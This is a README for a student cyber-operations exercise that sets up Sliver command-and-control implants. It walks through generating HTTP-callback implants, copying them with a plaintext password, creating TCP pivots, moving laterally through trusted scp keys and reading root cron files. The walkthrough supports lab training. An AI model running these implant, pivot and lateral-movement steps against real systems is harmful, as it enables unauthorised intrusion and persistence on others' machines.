# Cyber Ops Unit Sliver Setup
All the commands and files needed to set up the exercise, reminder that this exercise will **not** work over the TAMU network (because we can't port forward without access to the routers) and will have to be done over hotspot, where everyone will (probably) be on the same subnet, meaning they can directly SSH to the first machine

Make sure to run `sudo systemctl start sliver.service` to get Sliver working

Commands used:\
1. Generate Sliver Implant: `generate --os linux --arch arm64 --name [Implant Name] --http [IP of Teamserver]`\
2. Copy over to Intermediate server: `scp [Implant Name] aeverwooddesktop@[IP of Intermediate Server]:/home/aeverwooddesktop/Documents` (Password is 'password')\ 
3. Run Implant: `./[Implant Name] &`\
View sessions: `sessions`\
Use the Implant: `use [session number]`\
Create a pivot through that implant: `pivots tcp --lport [Pivot Port]`\
Generate an implant for that pivot: `generate --os linux --arch arm64 --tcp-pivot [IP Address of Intermediate Server:[Pivot Port] --name [Pivot Implant Name]`\
Upload that implant to his desktop with the upload command (More blendy than another SCP): `upload ./[Pivot Implant Name in Local Directory] ./[Pivot Implant Name in Remote Directory]`\
Use our implant to scp it over to the Final Server: `execute -o scp [Pivot Implant Name] aeverwooddesktop@[IP of Final Server]:/home/aeverwooddesktop/Documents` (His desktop is trusted because of the scp keys so there is no need for a password)`\
Naviagte to the tmp directory and see what is in one of the root_cron_job files: `execute -o cat root_cron_job_1.sh`\
